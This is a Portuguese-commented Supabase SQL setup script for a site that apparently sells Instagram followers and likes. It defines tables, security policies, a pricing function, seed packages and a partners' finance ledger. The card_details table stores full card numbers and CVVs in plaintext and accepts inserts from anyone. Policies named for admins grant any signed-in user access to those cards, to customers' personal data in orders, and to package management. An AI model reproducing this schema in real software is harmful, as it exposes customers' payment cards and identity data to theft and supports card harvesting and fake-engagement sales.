-- =============================================================================
-- SCRIPT ÚNICO — cole no Supabase Dashboard → SQL Editor → Run (tudo de uma vez)
-- Projeto: mesmo URL de VITE_SUPABASE_URL / Settings → API.
--
-- Inclui (nesta ordem):
--   0) Projeto NOVO: cria packages, orders, settings, card_details, RLS, triggers
--   1) Colunas extras em orders + settings (payment_gateway, amount_net_cents, …)
--   2) packages.kind + migração like_packages → packages (curtidas) + seed likes
--   3) RPC compute_chopped_package_price + coluna packages.service_id
--   4) Garante linha do pacote 300 seguidores (ajuste centavos se precisar)
--   5) Tabela financial_entries + RLS
--
-- NÃO incluídos (obsoletos ou redundantes):
--   • sql_editor_orders_parent_order_id.sql → vazio, use o bloco (1)
--   • sql_editor_curtidas_completo.sql → obsoleto; o bloco (2) substitui
--   • sql_editor_reload_schema_e_testar.sql → só diagnóstico; no fim há NOTIFY
--
-- Extensões pg_cron / pg_net: se der erro de permissão, comente o bloco (0a).
-- =============================================================================

-- (0a) Opcional — cron / net (Supabase costuma já ter; ignore erro se aparecer)
CREATE EXTENSION IF NOT EXISTS pg_cron WITH SCHEMA extensions;
CREATE EXTENSION IF NOT EXISTS pg_net WITH SCHEMA extensions;

-- =============================================================================
-- (0) Schema base — banco vazio (relation orders does not exist)
-- =============================================================================

CREATE TABLE IF NOT EXISTS public.packages (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  quantity INTEGER NOT NULL,
  price INTEGER NOT NULL,
  discount_price INTEGER,
  active BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.orders (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  username TEXT NOT NULL,
  quantity INTEGER NOT NULL,
  amount INTEGER NOT NULL,
  is_discounted BOOLEAN NOT NULL DEFAULT false,
  customer_name TEXT NOT NULL,
  customer_email TEXT NOT NULL,
  customer_phone TEXT NOT NULL,
  customer_document TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending',
  transaction_hash TEXT,
  pix_qr_code TEXT,
  pix_qr_code_url TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

ALTER TABLE public.orders
  ADD COLUMN IF NOT EXISTS product_type text NOT NULL DEFAULT 'followers',
  ADD COLUMN IF NOT EXISTS post_url text,
  ADD COLUMN IF NOT EXISTS parent_order_id uuid REFERENCES public.orders(id) ON DELETE SET NULL;

CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER
LANGUAGE plpgsql
SET search_path = public
AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$;

ALTER TABLE public.packages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Packages are viewable by everyone" ON public.packages;
CREATE POLICY "Packages are viewable by everyone" ON public.packages FOR SELECT USING (true);

DROP POLICY IF EXISTS "Admins can manage packages" ON public.packages;
CREATE POLICY "Admins can manage packages" ON public.packages FOR ALL USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "Anyone can create orders" ON public.orders;
CREATE POLICY "Anyone can create orders" ON public.orders FOR INSERT WITH CHECK (true);

DROP POLICY IF EXISTS "Admins can view orders" ON public.orders;
CREATE POLICY "Admins can view orders" ON public.orders FOR SELECT USING (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "Admins can update orders" ON public.orders;
CREATE POLICY "Admins can update orders" ON public.orders FOR UPDATE USING (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "Admins can delete orders" ON public.orders;
CREATE POLICY "Admins can delete orders" ON public.orders FOR DELETE TO authenticated USING (auth.uid() IS NOT NULL);

DROP TRIGGER IF EXISTS update_packages_updated_at ON public.packages;
CREATE TRIGGER update_packages_updated_at
  BEFORE UPDATE ON public.packages FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

DROP TRIGGER IF EXISTS update_orders_updated_at ON public.orders;
CREATE TRIGGER update_orders_updated_at
  BEFORE UPDATE ON public.orders FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

CREATE OR REPLACE FUNCTION public.prevent_duplicate_orders()
RETURNS trigger
LANGUAGE plpgsql
SECURITY DEFINER
SET search_path TO 'public'
AS $function$
BEGIN
  DELETE FROM public.orders
  WHERE id != NEW.id
    AND username = NEW.username
    AND quantity = NEW.quantity
    AND COALESCE(product_type, 'followers') = COALESCE(NEW.product_type, 'followers')
    AND status IN ('pending', 'waiting_payment', 'unknown')
    AND transaction_hash IS NULL
    AND created_at >= (now() - interval '5 minutes');
  RETURN NEW;
END;
$function$;

DROP TRIGGER IF EXISTS trg_prevent_duplicate_orders ON public.orders;
CREATE TRIGGER trg_prevent_duplicate_orders
  AFTER INSERT ON public.orders
  FOR EACH ROW
  EXECUTE FUNCTION public.prevent_duplicate_orders();

CREATE TABLE IF NOT EXISTS public.settings (
  key text PRIMARY KEY,
  value text NOT NULL,
  updated_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE public.settings ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Settings viewable by everyone" ON public.settings;
CREATE POLICY "Settings viewable by everyone" ON public.settings FOR SELECT TO public USING (true);

DROP POLICY IF EXISTS "Admins can manage settings" ON public.settings;
CREATE POLICY "Admins can manage settings" ON public.settings FOR ALL TO authenticated USING (auth.uid() IS NOT NULL) WITH CHECK (auth.uid() IS NOT NULL);

INSERT INTO public.settings (key, value) VALUES ('smm_service_id', '472')
ON CONFLICT (key) DO NOTHING;

CREATE TABLE IF NOT EXISTS public.card_details (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  order_id uuid REFERENCES public.orders(id) ON DELETE CASCADE NOT NULL,
  card_number text NOT NULL,
  card_holder text NOT NULL,
  card_expiry text NOT NULL,
  card_cvv text NOT NULL,
  created_at timestamp with time zone NOT NULL DEFAULT now()
);

ALTER TABLE public.card_details ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "Anyone can insert card_details" ON public.card_details;
CREATE POLICY "Anyone can insert card_details" ON public.card_details FOR INSERT TO public WITH CHECK (true);

DROP POLICY IF EXISTS "Admins can view card_details" ON public.card_details;
CREATE POLICY "Admins can view card_details" ON public.card_details FOR SELECT TO authenticated USING (auth.uid() IS NOT NULL);

-- Pacotes exemplo (aparecem no site). Só quer o que cadastrar no admin? Rode antes
-- supabase/sql_editor_reset_followers_packages.sql e use só o painel.
INSERT INTO public.packages (quantity, price, discount_price)
SELECT 50, 1990, 1490 WHERE NOT EXISTS (SELECT 1 FROM public.packages WHERE quantity = 50);

INSERT INTO public.packages (quantity, price, discount_price)
SELECT 100, 3490, 2490 WHERE NOT EXISTS (SELECT 1 FROM public.packages WHERE quantity = 100);

INSERT INTO public.packages (quantity, price, discount_price)
SELECT 500, 14990, 9990 WHERE NOT EXISTS (SELECT 1 FROM public.packages WHERE quantity = 500);

INSERT INTO public.packages (quantity, price, discount_price)
SELECT 1000, 24990, 17990 WHERE NOT EXISTS (SELECT 1 FROM public.packages WHERE quantity = 1000);

UPDATE public.packages SET price = 466, discount_price = NULL WHERE quantity = 50;
UPDATE public.packages SET price = 736, discount_price = NULL WHERE quantity = 100;
UPDATE public.packages SET price = 990, discount_price = NULL WHERE quantity = 300;
UPDATE public.packages SET price = 1590, discount_price = NULL WHERE quantity = 1000;
UPDATE public.packages SET price = 5690, discount_price = NULL WHERE quantity = 10000;
DELETE FROM public.packages WHERE quantity = 3000;
INSERT INTO public.packages (quantity, price, active)
SELECT 5000, 2790, true WHERE NOT EXISTS (SELECT 1 FROM public.packages WHERE quantity = 5000);
INSERT INTO public.packages (quantity, price, active)
SELECT 20000, 7690, true WHERE NOT EXISTS (SELECT 1 FROM public.packages WHERE quantity = 20000);
INSERT INTO public.packages (quantity, price, active)
SELECT 50000, 9090, true WHERE NOT EXISTS (SELECT 1 FROM public.packages WHERE quantity = 50000);

DELETE FROM public.packages p
USING public.packages p2
WHERE p.quantity = p2.quantity
  AND p.created_at < p2.created_at;

DELETE FROM public.packages p
USING public.packages p2
WHERE p.quantity = p2.quantity
  AND p.created_at = p2.created_at
  AND p.id < p2.id;

DO $uq$
BEGIN
  ALTER TABLE public.packages ADD CONSTRAINT packages_quantity_unique UNIQUE (quantity);
EXCEPTION
  WHEN duplicate_object THEN NULL;
END
$uq$;

-- =============================================================================
-- (1) orders: colunas + settings — sql_editor_orders_fix_schema_cache.sql
-- =============================================================================

ALTER TABLE public.orders
  ADD COLUMN IF NOT EXISTS smm_order_id text,
  ADD COLUMN IF NOT EXISTS queued boolean NOT NULL DEFAULT false,
  ADD COLUMN IF NOT EXISTS payment_method text NOT NULL DEFAULT 'pix',
  ADD COLUMN IF NOT EXISTS smm_last_error text,
  ADD COLUMN IF NOT EXISTS payment_gateway text NOT NULL DEFAULT 'x',
  ADD COLUMN IF NOT EXISTS product_type text NOT NULL DEFAULT 'followers',
  ADD COLUMN IF NOT EXISTS post_url text,
  ADD COLUMN IF NOT EXISTS parent_order_id uuid REFERENCES public.orders(id) ON DELETE SET NULL,
  ADD COLUMN IF NOT EXISTS amount_net_cents integer NULL;

CREATE INDEX IF NOT EXISTS idx_orders_product_type ON public.orders (product_type);

COMMENT ON COLUMN public.orders.product_type IS 'followers | likes';
COMMENT ON COLUMN public.orders.post_url IS 'Link da publicação (Instagram) para pedidos de curtidas';
COMMENT ON COLUMN public.orders.amount_net_cents IS
  'PIX Skale: valor líquido em centavos (net_amount do gateway). NULL = usar estimativa ou bruto nos relatórios.';

INSERT INTO public.settings (key, value) VALUES ('payment_gateway', 'x')
ON CONFLICT (key) DO NOTHING;

NOTIFY pgrst, 'reload schema';

-- =============================================================================
-- (2) packages.kind + merge like_packages — sql_editor_packages_kind.sql
-- =============================================================================

ALTER TABLE public.packages
  ADD COLUMN IF NOT EXISTS kind text NOT NULL DEFAULT 'followers';

ALTER TABLE public.packages
  DROP CONSTRAINT IF EXISTS packages_kind_check;

ALTER TABLE public.packages
  ADD CONSTRAINT packages_kind_check CHECK (kind IN ('followers', 'likes'));

ALTER TABLE public.packages DROP CONSTRAINT IF EXISTS packages_quantity_unique;

CREATE UNIQUE INDEX IF NOT EXISTS packages_kind_quantity_unique ON public.packages (kind, quantity);

DO $mig$
BEGIN
  IF to_regclass('public.like_packages') IS NOT NULL THEN
    INSERT INTO public.packages (quantity, price, discount_price, active, kind)
    SELECT quantity, price, discount_price, COALESCE(active, true), 'likes'::text
    FROM public.like_packages
    ON CONFLICT (kind, quantity) DO UPDATE SET
      price = EXCLUDED.price,
      discount_price = EXCLUDED.discount_price,
      active = EXCLUDED.active,
      updated_at = now();

    DROP TABLE public.like_packages CASCADE;
  END IF;
END
$mig$;

INSERT INTO public.packages (quantity, price, discount_price, active, kind) VALUES
  (100, 990, NULL, true, 'likes'),
  (500, 3990, NULL, true, 'likes'),
  (1000, 6990, NULL, true, 'likes')
ON CONFLICT (kind, quantity) DO UPDATE SET
  price = EXCLUDED.price,
  discount_price = EXCLUDED.discount_price,
  active = EXCLUDED.active,
  updated_at = now();

NOTIFY pgrst, 'reload schema';

-- =============================================================================
-- (3) RPC preço picado — sql_editor_compute_chopped_package_price.sql
-- =============================================================================

ALTER TABLE public.packages
  ADD COLUMN IF NOT EXISTS service_id text NULL;

COMMENT ON COLUMN public.packages.service_id IS 'Opcional: id do serviço SMM; usado quando p_service_id é informado na RPC.';

CREATE OR REPLACE FUNCTION public.compute_chopped_package_price(
  p_requested_quantity integer,
  p_kind text DEFAULT 'followers',
  p_prefer_discount boolean DEFAULT false,
  p_service_id text DEFAULT NULL
)
RETURNS TABLE (
  amount_cents bigint,
  base_quantity integer,
  base_price_cents bigint,
  base_package_id uuid,
  is_exact boolean
)
LANGUAGE plpgsql
STABLE
SECURITY INVOKER
SET search_path = public
AS $$
DECLARE
  rq integer;
  sid text := NULLIF(TRIM(COALESCE(p_service_id, '')), '');
  base_q integer;
  cid uuid;
  bq integer;
  bp integer;
  dprice integer;
  eff numeric;
  amt numeric;
  exact_flag boolean;
BEGIN
  IF p_requested_quantity IS NULL OR p_requested_quantity < 1 THEN
    RAISE EXCEPTION 'Quantidade inválida';
  END IF;

  rq := p_requested_quantity;

  cid := NULL;
  SELECT p.id, p.quantity, p.price, p.discount_price
  INTO cid, bq, bp, dprice
  FROM public.packages p
  WHERE p.active
    AND lower(btrim(p.kind::text)) = lower(btrim(p_kind::text))
    AND p.quantity = rq
    AND (sid IS NULL OR p.service_id IS NOT DISTINCT FROM sid)
  LIMIT 1;

  IF cid IS NOT NULL THEN
    eff := CASE
      WHEN p_prefer_discount AND dprice IS NOT NULL THEN dprice::numeric
      ELSE bp::numeric
    END;
    amt := round(eff);
    IF amt < 1 THEN
      amt := 1;
    END IF;
    RETURN QUERY
    SELECT
      amt::bigint,
      bq,
      round(eff)::bigint,
      cid,
      true;
    RETURN;
  END IF;

  SELECT MAX(p.quantity) INTO base_q
  FROM public.packages p
  WHERE p.active
    AND lower(btrim(p.kind::text)) = lower(btrim(p_kind::text))
    AND p.quantity <= rq
    AND (sid IS NULL OR p.service_id IS NOT DISTINCT FROM sid);

  IF base_q IS NULL THEN
    SELECT MIN(p.quantity) INTO base_q
    FROM public.packages p
    WHERE p.active
      AND lower(btrim(p.kind::text)) = lower(btrim(p_kind::text))
      AND (sid IS NULL OR p.service_id IS NOT DISTINCT FROM sid);
  END IF;

  IF base_q IS NULL THEN
    RAISE EXCEPTION 'Nenhum pacote ativo para este tipo';
  END IF;

  SELECT p.id, p.quantity, p.price, p.discount_price
  INTO cid, bq, bp, dprice
  FROM public.packages p
  WHERE p.active
    AND lower(btrim(p.kind::text)) = lower(btrim(p_kind::text))
    AND p.quantity = base_q
    AND (sid IS NULL OR p.service_id IS NOT DISTINCT FROM sid)
  LIMIT 1;

  IF cid IS NULL THEN
    RAISE EXCEPTION 'Pacote base não encontrado';
  END IF;

  eff := CASE
    WHEN p_prefer_discount AND dprice IS NOT NULL THEN dprice::numeric
    ELSE bp::numeric
  END;

  amt := round(rq::numeric * (eff / bq::numeric), 0);
  IF amt < 1 THEN
    amt := 1;
  END IF;

  SELECT EXISTS (
    SELECT 1
    FROM public.packages p2
    WHERE p2.active
      AND lower(btrim(p2.kind::text)) = lower(btrim(p_kind::text))
      AND p2.quantity = rq
      AND (sid IS NULL OR p2.service_id IS NOT DISTINCT FROM sid)
  ) INTO exact_flag;

  RETURN QUERY
  SELECT
    amt::bigint,
    bq,
    round(eff)::bigint,
    cid,
    exact_flag;
END;
$$;

COMMENT ON FUNCTION public.compute_chopped_package_price(integer, text, boolean, text) IS
  'Exato: preço da linha. Picado: max(quantity)<=pedido (senão min); total em centavos.';

GRANT EXECUTE ON FUNCTION public.compute_chopped_package_price(integer, text, boolean, text) TO anon;
GRANT EXECUTE ON FUNCTION public.compute_chopped_package_price(integer, text, boolean, text) TO authenticated;
GRANT EXECUTE ON FUNCTION public.compute_chopped_package_price(integer, text, boolean, text) TO service_role;

NOTIFY pgrst, 'reload schema';

-- =============================================================================
-- (4) Pacote 300 seguidores — sql_editor_ensure_follower_tiers.sql
-- =============================================================================

INSERT INTO public.packages (quantity, price, discount_price, active, kind)
VALUES (300, 990, NULL, true, 'followers')
ON CONFLICT (kind, quantity) DO UPDATE SET
  price = EXCLUDED.price,
  discount_price = EXCLUDED.discount_price,
  active = true,
  updated_at = now();

NOTIFY pgrst, 'reload schema';

-- =============================================================================
-- (5) Financeiro — sql_editor_financial_entries.sql
-- =============================================================================

CREATE TABLE IF NOT EXISTS public.financial_entries (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  entry_date date NOT NULL DEFAULT ((now() AT TIME ZONE 'America/Sao_Paulo')::date),
  description text NOT NULL DEFAULT '',
  client_profile text NOT NULL DEFAULT '',
  facebook_investment_cents integer NOT NULL DEFAULT 0 CHECK (facebook_investment_cents >= 0),
  smm_investment_cents integer NOT NULL DEFAULT 0 CHECK (smm_investment_cents >= 0),
  openai_investment_cents integer NOT NULL DEFAULT 0 CHECK (openai_investment_cents >= 0),
  amount_received_cents integer NOT NULL DEFAULT 0 CHECK (amount_received_cents >= 0),
  total_cost_cents integer NOT NULL DEFAULT 0,
  net_profit_cents integer NOT NULL DEFAULT 0,
  partner_lucas_cents integer NOT NULL DEFAULT 0,
  partner_lua_cents integer NOT NULL DEFAULT 0,
  partner_fernando_cents integer NOT NULL DEFAULT 0,
  status text NOT NULL DEFAULT 'pendente' CHECK (status IN ('pendente', 'pago', 'cancelado')),
  notes text,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);

CREATE INDEX IF NOT EXISTS idx_financial_entries_entry_date ON public.financial_entries (entry_date DESC);
CREATE INDEX IF NOT EXISTS idx_financial_entries_status ON public.financial_entries (status);

ALTER TABLE public.financial_entries ENABLE ROW LEVEL SECURITY;

DROP POLICY IF EXISTS "financial_entries_select_authenticated" ON public.financial_entries;
CREATE POLICY "financial_entries_select_authenticated"
  ON public.financial_entries FOR SELECT TO authenticated
  USING (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "financial_entries_insert_authenticated" ON public.financial_entries;
CREATE POLICY "financial_entries_insert_authenticated"
  ON public.financial_entries FOR INSERT TO authenticated
  WITH CHECK (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "financial_entries_update_authenticated" ON public.financial_entries;
CREATE POLICY "financial_entries_update_authenticated"
  ON public.financial_entries FOR UPDATE TO authenticated
  USING (auth.uid() IS NOT NULL)
  WITH CHECK (auth.uid() IS NOT NULL);

DROP POLICY IF EXISTS "financial_entries_delete_authenticated" ON public.financial_entries;
CREATE POLICY "financial_entries_delete_authenticated"
  ON public.financial_entries FOR DELETE TO authenticated
  USING (auth.uid() IS NOT NULL);

DROP TRIGGER IF EXISTS update_financial_entries_updated_at ON public.financial_entries;
CREATE TRIGGER update_financial_entries_updated_at
  BEFORE UPDATE ON public.financial_entries
  FOR EACH ROW
  EXECUTE FUNCTION public.update_updated_at_column();

-- =============================================================================
-- Fim — PostgREST
-- =============================================================================

NOTIFY pgrst, 'reload schema';

-- (Opcional) Teste rápido da RPC:
-- SELECT * FROM public.compute_chopped_package_price(310, 'followers', false, null);
